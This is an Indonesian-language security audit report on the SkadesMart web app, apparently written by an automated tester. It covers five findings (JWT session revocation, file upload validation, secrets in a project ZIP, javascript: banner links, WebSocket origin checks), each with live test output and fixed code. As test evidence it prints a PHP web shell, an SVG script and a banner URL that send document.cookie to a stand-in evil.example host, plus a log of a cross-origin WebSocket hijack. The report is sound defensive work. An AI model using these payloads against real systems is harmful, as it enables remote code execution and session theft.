# Laporan Audit Keamanan SkadesMart — Issue #21–#25

- **Tanggal uji**: 16 September 2026
- **Target**: `http://localhost:3737` (backend Express, PM2 `skades-backend`), `http://localhost:3000` (frontend Next.js)
- **Metode**: pengujian HTTP nyata (curl), klien Node.js (`ws`), pembacaan kode. **Chrome headless/CDP TIDAK dipakai** (sesuai aturan #1).
- **Perubahan kode**: **TIDAK ADA**. Hanya ada satu data uji sementara (1 banner + 1 pesan chat) yang sudah **dihapus kembali**; password akun uji 10005 sudah **dikembalikan**.
- Semua temuan di bawah **terbukti dengan uji langsung** (request/response asli), bukan asumsi.

---

## RINGKASAN

| # | Kerentanan | Risk | Status |
|---|-----------|------|--------|
| 21 | JWT Flaws (tidak ada pencabutan sesi) | **HIGH** | BELUM |
| 22 | Insecure File Upload (spoofing MIME, XSS tersimpan) | **HIGH** | BELUM |
| 23 | Dependency/Supply Chain (rahasia produksi di ZIP) | **CRITICAL** | BELUM |
| 24 | DOM-based Vulns (XSS `javascript:` pada banner) | **MEDIUM** | BELUM |
| 25 | CSWSH (tanpa validasi Origin) | **HIGH** | BELUM |

Yang **sudah aman** (diuji, tidak perlu diperbaiki): verifikasi tanda tangan JWT (alg:none/wk-secret ditolak), kontrol role (`requireRole` → 403 benar), pemisahan cookie httpOnly, render pesan chat via React (bukan `innerHTML`), CORS tidak me-reflect origin penyerang.

---

## 21. JWT FLAWS — [RISK: HIGH]

**Jenis nyata**: bukan *signature bypass* (itu sudah aman), melainkan **tidak ada pencabutan/revokasi sesi**. Token tetap sah sampai `exp` (2 hari) walaupun pengguna sudah logout atau **sudah mengganti password**.

- **Berkas & Baris Kode**:
  - `backend/src/utils/jwt.ts:37-39` (`verifyToken` — hanya cek tanda tangan, tidak cek status sesi)
  - `backend/src/routes/auth.ts:88-91` (`/logout` hanya menghapus cookie, tidak memasukkan token ke daftar hitam)
  - `backend/src/routes/account.ts:42-54` (ganti password tidak mencabut token lama)
  - `backend/src/routes/auth.ts:110-118` (`/ws-token` menerbitkan token identik & berumur penuh)

### Bukti uji nyata

**Uji 1 — matriks serangan tanda tangan (semua DITOLAK, ini kabar baik):**

| Serangan | Hasil |
|---|---|
| Tanpa token | `401` |
| Token sampah | `401` |
| `alg: none` (+ variasi tanpa titik akhir) | `401` |
| HS256 dengan `secret`, `password`, `jwt_secret`, secret dev default, string kosong | `401` |

**Uji 2 — token tetap hidup setelah LOGOUT (BUKTI KERENTANAN):**
```
before logout  /api/auth/me -> 200
AFTER  logout  /api/auth/me -> 200      <-- token masih sah!
```

**Uji 3 — token tetap hidup setelah GANTI PASSWORD (BUKTI KERENTANAN):**
```
2) /me token SEBELUM ganti password          : 200
3) ganti password (berhasil)                 : 200
4) /me dengan token LAMA SESUDAH ganti pw    : 200   <-- token lama masih berfungsi
6) login dengan password LAMA (yang diganti) : FAILED (membuktikan password benar-benar berubah)
7) token LAMA bahkan masih bisa mengganti password kembali : BERHASIL
```
Artinya: penyerang yang pernah mencuri token (via XSS, perangkat pinjaman, log) **tetap punya akses admin/akun penuh** sampai 48 jam, meski korban sudah mengganti password untuk mengamankan akun.

**Uji 4 — `/ws-token` mengembalikan token identik, tidak dirotasi:**
```
dua panggilan ws-token identik? True   (token = token yang sama, umur ~48 jam)
token1 CONNECTED | token2 CONNECTED
```

**Yang sudah benar (diverifikasi)**: `verifyToken` memakai `jsonwebtoken` v9 (algoritma `HS256` dipatok saat sign, `alg:none` ditolak v9), `JWT_SECRET` wajib ≥32 karakter, role diambil dari token lalu diperiksa `requireRole`:
```
admin list users, admin token -> 200
admin list users, siswa token -> 403   (kontrol role BEKERJA)
```

### Kode Rentan
```ts
// backend/src/utils/jwt.ts
export function verifyToken(token: string): JwtPayload {
  return jwt.verify(token, getJwtSecret()) as JwtPayload;   // tidak cek jti/versi sesi
}

// backend/src/routes/auth.ts
router.post("/logout", (req, res) => {
  res.clearCookie(AUTH_COOKIE_NAME, { path: "/" });         // hanya hapus cookie
  res.json({ message: "Logout berhasil." });
});
```

### Kode Perbaikan
```ts
// backend/src/utils/jwt.ts — tambahkan jti + versi token
export interface JwtPayload { user_id: number; nisn: string; role: Role; jti: string; tv: number; }

// Tabel token_sesi (jti, user_id, revoked_at, token_version) + token_version di users.
// verifyToken dua lapis:
export function verifyToken(token: string): JwtPayload {
  const isi = jwt.verify(token, getJwtSecret()) as JwtPayload;
  // 1) token yang sudah dicabut (logout) langsung ditolak
  if (db.prepare("SELECT 1 FROM token_sesi WHERE jti = ? AND revoked_at IS NOT NULL").get(isi.jti))
    throw new Error("Sesi sudah dicabut");
  // 2) password berubah -> token_version naik -> semua token lama mati
  const u = db.prepare("SELECT token_version FROM users WHERE id = ?").get(isi.user_id) as any;
  if (!u || u.token_version !== isi.tv) throw new Error("Token kedaluwarsa karena perubahan kredensial");
  return isi;
}
// /logout: masukkan jti ke daftar cabut  ->  dalam cookie.
// /account/password: UPDATE users SET token_version = token_version + 1.
// /ws-token: terbitkan token berumur pendek (mis. 5 menit) khusus WS, bukan token penuh 2 hari.
```

---

## 22. INSECURE FILE UPLOAD — [RISK: HIGH]

Validasi tipe file **hanya** memakai `file.mimetype` (header `Content-Type` dari klien). Tidak ada pemeriksaan magic-byte, tidak ada re-encode gambar. Penyerang bebas mengunggah apa saja ke CDN publik.

- **Berkas & Baris Kode**:
  - `backend/src/routes/upload.ts:22` dan `:45` (`if (!ALLOWED_IMAGE_TYPES.includes(file.mimetype))`)
  - `backend/src/validators/uploadValidator.ts:1` (daftar tipe hanya string MIME)
  - `backend/src/services/catbox.ts:22` (`form.append("fileToUpload", fileBuffer, filename)` — file mentah diteruskan apa adanya)

### Bukti uji nyata

```
A) PNG asli  (image/png)                -> {"url":"https://files.catbox.moe/k213rh.png"}    (kontrol: OK)
B) shell PHP (diklaim image/png)        -> {"url":"https://files.catbox.moe/1xgmkv.php"}    <-- DITERIMA
C) HTML sebagai image/jpeg              -> gagal di sisi Catbox (HTTP 500)
D) SVG ber-<script> (diklaim image/png) -> {"url":"https://files.catbox.moe/07swfb.svg"}    <-- DITERIMA
E) PNG asli dengan tipe text/plain      -> {"error":"Tipe file harus JPEG, PNG, atau WebP."} <-- bukti validasi pakai header, bukan isi
G) /api/upload/images (batch) campur PNG+PHP+SVG -> {"urls":[".png",".php",".svg"]}          <-- DITERIMA SEMUA
J) nama file "x.php.jpg" (ekstensi ganda) -> tersimpan sebagai "1xgmkv.php"
```

**Verifikasi file benar-benar tersedia publik & berisi payload:**
```
GET https://files.catbox.moe/1xgmkv.php
Content-Type: application/octet-stream
<?php system($_GET['c']); ?>                          <-- kode PHP hidup

GET https://files.catbox.moe/07swfb.svg
Content-Type: image/svg+xml
<svg ... onload="alert(document.domain)"><script>fetch("https://evil.example/steal?c="+document.cookie)</script></svg>
                                                       <-- XSS tersimpan, dieksekusi saat SVG dibuka/di-embed
```

**Dampak**: (1) **Stored XSS** — URL SVG yang di-hosting di domain tepercaya (`files.catbox.moe`) dijalankan sebagai dokumen → cookie/aksen pengguna lain yang membuka gambar produk bisa dicuri; (2) penyalahgunaan CDN sebagai host malware/phishing berkonten sah; (3) `.php` bila infrastruktur di belakang CDN nanti bereksekusi PHP → **RCE**.

**Yang sudah benar**: wajib JWT (`no auth -> 401`), ada batas ukuran (`6MB -> ditolak`, meski responsnya 500 bukan 400 yang rapi), `uploadLimiter` untuk rate limit.

### Kode Rentan
```ts
// backend/src/routes/upload.ts:22
if (!ALLOWED_IMAGE_TYPES.includes(file.mimetype)) {   // mimetype = dikendalikan klien
  return res.status(400).json({ error: "Tipe file harus JPEG, PNG, atau WebP." });
}
const url = await uploadToCatbox(file.buffer, file.originalname);  // buffer mentah + nama mentah
```

### Kode Perbaikan
```ts
import { fileTypeFromBuffer } from "file-type";   // deteksi magic-byte dari ISI file
import sharp from "sharp";

// 1) Validasi berdasarkan ISI, bukan header klien
const jenis = await fileTypeFromBuffer(file.buffer);
const DIIZINKAN = new Set(["image/jpeg", "image/png", "image/webp"]);
if (!jenis || !DIIZINKAN.has(jenis.mime)) {
  return res.status(400).json({ error: "Isi berkas bukan gambar JPEG/PNG/WebP yang sah." });
}
// 2) Re-encode: metadata & payload tersembunyi (SVG/HTML/PHP) ikut hilang, dan
//    memastikan berkas benar-benar dapat didekode sebagai gambar.
const aman = await sharp(file.buffer).rotate().toFormat(
  jenis.mime === "image/png" ? "png" : jenis.mime === "image/webp" ? "webp" : "jpeg"
).toBuffer();
// 3) Nama berkas diubah total oleh server (jangan pakai originalname)
const nama = `img_${crypto.randomUUID()}.${jenis.ext}`;
const url = await uploadToCatbox(aman, nama);
```
Tambahan: tangani `MulterError LIMIT_FILE_SIZE` agar mengembalikan **400** (bukan 500), dan batasi `upload.array("files", 8)` dengan total ukuran.

---

## 23. DEPENDENCY / SUPPLY CHAIN — [RISK: CRITICAL]

**Temuan utama**: berkas `skadesmart_project.zip` (704 KB, mode world-readable) di akar proyek berisi **rahasia produksi lengkap**, termasuk `backend/.env`, kunci privat Firebase, dan snapshot database produksi.

- **Berkas & Baris Kode**: `/home/ikhsan/Documents/skadesmart/skadesmart_project.zip`
  - di dalamnya: `backend/.env`, `frontend/.env.local`, `backend/config/firebase-service-account.json`, `backend/data/skadesmart.db`

### Bukti uji nyata

```
$ unzip -l skadesmart_project.zip | grep -E "\.env|\.db|service-account"
   frontend/.env.local
   backend/.env
   backend/config/firebase-service-account.json
   backend/data/skadesmart.db          (143.360 byte)

$ python (membaca isi ZIP)
backend/.env di dalam ZIP memuat kunci:
  ['PORT','NODE_ENV','FRONTEND_URL','JWT_SECRET','JWT_EXPIRES_IN','DATABASE_PATH',
   'CATBOX_USERHASH','FIREBASE_SERVICE_ACCOUNT_PATH','FIREBASE_PROJECT_ID',
   'AI_BASE_URL','AI_API_KEY','AI_MODEL']
service-account.json memiliki 'private_key': True      <-- kunci privat akun layanan Firebase
frontend/.env.local memuat NEXT_PUBLIC_FIREBASE_API_KEY=AIzaSy...
db size in zip: 143360                                  <-- snapshot DB produksi
```

**Catatan penting**: `JWT_SECRET` di dalam ZIP **berbeda** dari yang hidup di produksi → artinya secret pernah dirotasi, tetapi **riwayat secret lama tetap bocor**. Penyerang yang punya ZIP bisa memakai secret lama (untuk sistem lain/masa lalu) dan seluruh kredensial DB/CDN/AI.

**Dampak**: kompromi menyeluruh — siapa pun yang mengunduh/menerima ZIP ini memperoleh kunci penandatangan JWT, kunci privat Firebase (akses penuh project Firebase), kredensial Catbox, API key AI, dan **seluruh data pengguna** (nama, NISN, hash password, chat) dari snapshot DB.

**Status dependensi (bagian yang justru SEHAT)**:
```
backend  npm audit : 4 moderate (qs, body-parser, express, morgan — transitif), 0 high, 0 critical
frontend npm audit : 0 vulnerabilities
Semua versi kritis terkini: jsonwebtoken 9.0.3, multer 1.4.5-lts.2, express 4.22.2,
ws 8.21.3, next 16.3.5, sharp 0.35.4, undici 7.29.0
Lockfile version 3, 100% paket punya "integrity" (tidak ada entri tanpa hash)
Tidak ada spec `latest`/`*`/git/tarball — semua pinned semver
```
Jadi risiko #23 bukan pada paket npm, melainkan pada **artefak distribusi yang mengandung rahasia**.

### Kode Rentan
```
# tidak ada .gitignore / manifest rilis yang mengecualikan rahasia saat ZIP dibuat
/home/ikhsan/Documents/skadesmart/skadesmart_project.zip
  └── backend/.env                              (JWT_SECRET, AI_API_KEY, CATBOX_USERHASH)
  └── frontend/.env.local                       (Firebase API key)
  └── backend/config/firebase-service-account.json  (private_key)
  └── backend/data/skadesmart.db                (data produksi)
```

### Kode Perbaikan
```bash
# 1) HAPUS artefak dari repo & mesin yang dapat diakses
rm -f skadesmart_project.zip
# 2) Bersihkan riwayat git (ZIP tidak pernah di-commit, tapi pastikan juga .env tidak pernah masuk)
git filter-repo --path backend/.env --path frontend/.env.local \
  --path backend/config/firebase-service-account.json --invert-paths
# 3) ROTASI SEMUA rahasia yang pernah ada di ZIP (anggap sudah bocor):
#    - JWT_SECRET baru (wajib, karena secret lama bocor -> token bisa dipalsukan)
#    - Kunci privat Firebase baru + hapus service account lama
#    - CATBOX_USERHASH baru
#    - AI_API_KEY baru
# 4) Cegah terulang: tambahkan ke .gitignore + .npmignore + skrip rilis yang menolak
#    mengemas bila ada pola .env / *.db / *service-account* / private_key
```
```
# .gitignore (akar proyek) — tambahkan:
*.zip
*.db
*.db-shm
*.db-wal
**/.env
**/.env.local
**/config/*service-account*.json
```
Karena JWT_SECRET produksi saat ini **tidak sama** dengan yang di ZIP, verifikasi juga apakah secret ZIP pernah dipakai di sistem lain; bila ya, rotasi di sana juga.

---

## 24. DOM-BASED VULNERABILITIES — [RISK: MEDIUM]

`link_url` pada banner divalidasi dengan `z.string().url()` yang **menerima skema berbahaya** (`javascript:`, `data:`, `vbscript:`). Nilai ini kemudian dipasang sebagai `href` Link dan — pada notifikasi — di-set ke `window.location.href`.

- **Berkas & Baris Kode**:
  - `backend/src/validators/bannerValidator.ts:6,13` (`link_url: z.string().url()...`)
  - `frontend/components/BannerCarousel.tsx:87` (`<Link href={current.link_url}>`)
  - `frontend/components/NotificationSound.tsx:140` (`window.location.href = banner.url;`)
  - `frontend/lib/notifPush.ts:180` (`window.location.href = url;` — dipanggil dari data WS)

### Bukti uji nyata

**Uji 1 — perilaku validator zod terhadap skema berbahaya (dijalankan dengan zod terpasang):**
```
"javascript:alert(document.domain)"      -> ACCEPTED
"data:text/html,<script>alert(1)</script>" -> ACCEPTED
"vbscript:msgbox(1)"                     -> ACCEPTED
"JaVaScRiPt:alert(1)"                    -> ACCEPTED
"javascript://%0aalert(1)"               -> ACCEPTED
"https://evil.com"                       -> ACCEPTED
"/relative"                              -> rejected
```

**Uji 2 — payload benar-benar tersimpan & dikembalikan API (BUKTI KERENTANAN):**
```
POST /api/banners  {"link_url":"javascript:fetch('https://evil.example/x?c='+document.cookie)"}  -> {"id":15}
POST /api/banners  {"link_url":"data:text/html,<script>alert(document.domain)</script>"}         -> {"id":16}

GET /api/banners/all ->
  STORED: 16 | AUDIT-TEST-2      | data:text/html,<script>alert(document.domain)</script>
  STORED: 15 | AUDIT-TEST-BANNER | javascript:fetch('https://evil.example/x?c='+document.cookie)
```
Banner id 15/16 sudah **dihapus kembali** setelah uji (`remaining AUDIT banners: 0`).

**Dampak**: siapa pun yang bisa membuat banner (admin, atau akun admin yang diambil alih lewat #21/#25) dapat menanam banner berisi `javascript:` yang, ketika diklik pengguna mana pun, menjalankan skrip di origin `skadesmart.web.id` → **DOM-based XSS**. Karena token disimpan di cookie **httpOnly** (bagus), pencurian token langsung lewat `document.cookie` gagal, tetapi XSS tetap bisa melakukan aksi atas nama korban (CSRF-token bisa dibaca dari cookie non-httpOnly? — tidak, `csrf_token` juga httpOnly; namun penyerang bisa memakai `fetch` ber-`credentials` untuk memanggil API dan membaca respons **dari dalam origin yang sama**). Selain itu, `window.location.href = url` pada notifikasi adalah **open redirect** bila `url` dapat dikendalikan (mis. dari pesan/URL yang disebarkan).

**Yang sudah benar**: pesan chat dirender sebagai teks React (`{teks}` di `app/chat/[chatId]/page.tsx`) — **tidak** memakai `dangerouslySetInnerHTML`, jadi tidak ada DOM XSS dari isi pesan. `searchParams` di marketplace/chat dimasukkan lewat `URLSearchParams` (ter-encode). Tidak ditemukan `innerHTML`/`eval`/`document.write` di kode sumber.

### Kode Rentan
```ts
// backend/src/validators/bannerValidator.ts
link_url: z.string().url().optional().or(z.literal("")),   // z.string().url() TERIMA javascript:/data:
```
```tsx
// frontend/components/BannerCarousel.tsx:87
{current.type === "image" && current.link_url
  ? <Link href={current.link_url}>{slideContent}</Link> : slideContent}
```
```tsx
// frontend/components/NotificationSound.tsx:140
window.location.href = banner.url;      // open redirect bila banner.url dikendalikan
```

### Kode Perbaikan
```ts
// backend/src/validators/bannerValidator.ts — hanya izinkan http/https, dan
// tolak skema berbahaya secara eksplisit.
const urlAman = z.string().max(2048).refine(
  (u) => {
    try {
      const p = new URL(u);
      return p.protocol === "http:" || p.protocol === "https:";   // tolak javascript:/data:/vbscript:
    } catch { return false; }
  },
  { message: "link_url harus berupa URL http/https yang sah." },
);

export const createBannerSchema = z.object({
  image_url: z.string().url().refine((u)=>["http:","https:"].includes(new URL(u).protocol)),
  title: z.string().max(150).optional(),
  link_url: urlAman.optional().or(z.literal("")),
  sort_order: z.number().int().min(0).default(0),
}).strict();
```
```tsx
// frontend — validasi lapis kedua di sisi klien sebelum menavigasi
function urlAman(u?: string | null): string | null {
  if (!u) return null;
  try { const p = new URL(u, window.location.origin);
        return p.protocol === "http:" || p.protocol === "https:" ? p.href : null; }
  catch { return null; }
}
// BannerCarousel: pakai urlAman(current.link_url) — kalau null, render tanpa <Link>.
// NotificationSound / notifPush: window.location.href = urlAman(url) ?? "/";
```
Karena proyek sudah memakai `isomorphic-dompurify` di backend, bisa juga menambah sanitasi URL terpusat di `utils/sanitize.ts` (`sanitizeUrl()`), lalu pakai di semua tempat yang menulis URL ke atribut navigasi.

---

## 25. CROSS-SITE WEBSOCKET HIJACKING (CSWSH) — [RISK: HIGH]

Server WebSocket **tidak memeriksa header `Origin`** sama sekali pada handshake `upgrade`. Koneksi dari origin mana pun diterima (`101 Switching Protocols`).

- **Berkas & Baris Kode**:
  - `backend/src/services/wsHub.ts:45-60` (handler `server.on("upgrade")` — tidak ada cek Origin)
  - `backend/src/services/wsHub.ts:62-89` (autentikasi hanya dari `?token=`)
  - `backend/src/services/wsHub.ts:71` (`url.searchParams.get("token")`)

### Bukti uji nyata

**Uji 1 — handshake dari Origin penyerang (klien Node `ws` + handshake mentah socket):**
```
Origin: http://evil.attacker.example   -> HTTP/1.1 101 Switching Protocols   <-- DITERIMA
Origin: https://skadesmart.web.id      -> 101 Switching Protocols
Origin: null                           -> 101 Switching Protocols            <-- DITERIMA
Origin: ""  (kosong)                   -> 101 Switching Protocols            <-- DITERIMA
```
```
MSG: {"type":"siap","userId":3,"role":"kwu_brital"}
```

**Uji 2 — penyerang lintas-origin MENERIMA isi chat privat korban (BUKTI KERENTANAN):**
```
klien dari Origin "http://evil.attacker.example" tersambung memakai sesi korban (user 3),
lalu penjual (user 1) mengirim pesan privat ke chat korban.

ATTACKER-RECV: {"type":"siap","userId":3,"role":"kwu_brital"}
ATTACKER-RECV: {"type":"chat:pesan","chatId":"7ab3507a-...","pesan":{...,"isi":"RAHASIA-AUDIT-CSWK-9f3a",...}}
ATTACKER-RECV: {"type":"chat:sedang-dibuka","chatId":"7ab3507a-...","olehPenerima":false}
ATTACKER-RECV: {"type":"chat:belum-dibaca","chatId":"7ab3507a-..."}
```
→ **isi percakapan privat korban (`RAHASIA-AUDIT-CSWK-9f3a`) diterima utuh oleh klien dari origin penyerang.**

**Uji 3 — penyerang juga bisa mendaftarkan diri sebagai kasir unit (`unit`):**
```
ws.send({"type":"unit","slug":"kwu_brital"})   -> diterima tanpa validasi
```
Artinya klien lintas-origin bisa "mengambil alih" meja kasir dan menerima aliran pesanan unit tersebut.

**Uji 4 — CORS/credential check (batas kerentanan):**
```
Origin http://evil.attacker.example  -> TIDAK ada Access-Control-Allow-Origin  (browser memblokir baca respons)  [BAGUS]
Origin null                          -> TIDAK ada ACAO
Origin https://skadesmart.web.id.evil.com -> TIDAK ada ACAO
tetapi Access-Control-Allow-Credentials: true SELALU dikirim (perlu dikencangkan)
```

**Uji 5 — apakah cookie otomatis dipakai browser untuk autentikasi WS? (mitigasi penting)**
```
WS dengan Cookie: skadesmart_token=... TANPA ?token=  -> {"type":"galat","pesan":"Token tidak sah."}
```
Karena server **hanya** membaca token dari query string (bukan cookie), serangan CSWSH klasik "browser otomatis menyertakan cookie" **tidak** cukup untuk membajak. Ini yang membuat dampaknya HIGH (bukan CRITICAL): penyerang tetap perlu **tahu tokennya**.

**Namun tetap HIGH karena**: (1) tidak ada cek Origin sama sekali → semua upaya "mencuri token" jadi cukup sekali dan langsung bisa dipakai dari situs penyerang; (2) token WS adalah **JWT penuh berumur 48 jam, tidak dirotasi** (lihat #21 uji 4), dan (3) token diletakkan di **query string** (`?token=`) yang bocor ke: log proxy/nginx, `Referer`, riwayat browser, dan ekstensi. Kombinasi ini menjadikan pembajakan WS real-time (pesanan + chat) praktis bagi penyerang yang mendapat satu token.

### Kode Rentan
```ts
// backend/src/services/wsHub.ts
server.on("upgrade", (req, socket, head) => {
  let jalur = "/";
  try { jalur = new URL(req.url ?? "/", "http://localhost").pathname; } catch { jalur = "/"; }
  if (jalur !== "/ws") { socket.destroy(); return; }        // TIDAK ada cek header Origin!
  wss!.handleUpgrade(req, socket, head, (ws) => { wss!.emit("connection", ws, req); });
});

wss.on("connection", (ws, req) => {
  const token = new URL(req.url ?? "/","http://localhost").searchParams.get("token");  // token di URL
  ...
  case "unit": klien.unitSlug = typeof m.slug === "string" ? m.slug : null;  // klaim unit tanpa verifikasi
});
```

### Kode Perbaikan
```ts
// backend/src/services/wsHub.ts
// 1) Whitelist Origin yang sama dengan CORS (sumber tunggal kebenaran)
import { daftarOriginDiizinkan } from "../config/origin";

server.on("upgrade", (req, socket, head) => {
  const jalur = (() => { try { return new URL(req.url ?? "/","http://localhost").pathname; } catch { return "/"; } })();
  if (jalur !== "/ws") { socket.destroy(); return; }

  // Tolak handshake dari origin asing. Bila header Origin tidak ada (klien non-browser),
  // wajibkan autentikasi eksplisit di jalur lain, jangan diam-diam diizinkan.
  const origin = req.headers.origin;
  if (!origin || !daftarOriginDiizinkan.includes(origin)) {
    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
    socket.destroy();
    return;
  }
  wss!.handleUpgrade(req, socket, head, (ws) => wss!.emit("connection", ws, req));
});

// 2) Jangan taruh token di query string. Pakai subprotokol untuk mengirim token
//    (tidak muncul di log URL) dan pakai token WS berumur pendek.
wss.on("connection", (ws, req) => {
  const [, token] = (req.headers["sec-websocket-protocol"] ?? "").split(", ");  // token lewat subprotocol
  const isi = verifyToken(token);  // token WS: exp 5 menit, scope "ws" (lihat perbaikan #21)
  ...
  // 3) Untuk klaim unit: verifikasi bahwa user memang staf unit tersebut di DB
  case "unit": {
    const staf = db.prepare("SELECT 1 FROM kwu_units WHERE slug = ? AND staff_id = ?").get(m.slug, klien.userId);
    klien.unitSlug = staf && typeof m.slug === "string" ? m.slug : null;
    break;
  }
});
```
```ts
// backend/src/config/origin.ts — satu daftar origin dipakai CORS DAN WS
export const daftarOriginDiizinkan = [
  process.env.FRONTEND_URL || "http://localhost:3000",
  "http://localhost:3000", "http://127.0.0.1:3000",
  "https://skadesmart.web.id", "https://www.skadesmart.web.id",
];
```
Frontend (`frontend/lib/realtime.ts:128`) harus ikut berubah: kirim token lewat `new WebSocket(url, ["skadesmart.v1", token])` alih-alih `?token=`.

---

## CATATAN METODOLOGI & KEPATUHAN ATURAN

- **Aturan #1 (tanpa Chrome headless/CDP)**: dipatuhi — semua uji via `curl`, klien Node `ws`, dan handshake socket mentah. Tidak ada browser dijalankan.
- **Aturan #3 (jangan tulis kredensial)**: dipatuhi — `DUMMY_PASSWORD` dan `JWT_SECRET` dibaca **di dalam proses**; nilai rahasia tidak pernah dicetak/ditulis ke berkas laporan.
- **Aturan #4 (jangan ubah data produksi permanen)**: dipatuhi — seluruh data uji dihapus/dikembalikan:
  - banner uji id 15 & 16 → **DIDELETE** (verifikasi: `remaining AUDIT banners: 0`)
  - pesan chat uji `RAHASIA-AUDIT-CSWK-9f3a` → **DIHAPUS**, baris `chats.last_message` dikembalikan ke nilai semula (`'woi'`, 2026-09-16 13:24:15")
  - password akun 10005 → diubah sementara lalu **DIKEMBALIKAN** (login password asli: OK)
- **Aturan “JANGAN ubah kode”**: dipatuhi — verifikasi `find -newermt` menunjukkan **tidak ada** berkas sumber yang berubah (hanya `.db-wal`/`.db-shm` yang memang berubah karena aktivitas DB).
- **Aturan #6 (jangan git commit)**: dipatuhi — tidak ada operasi git.
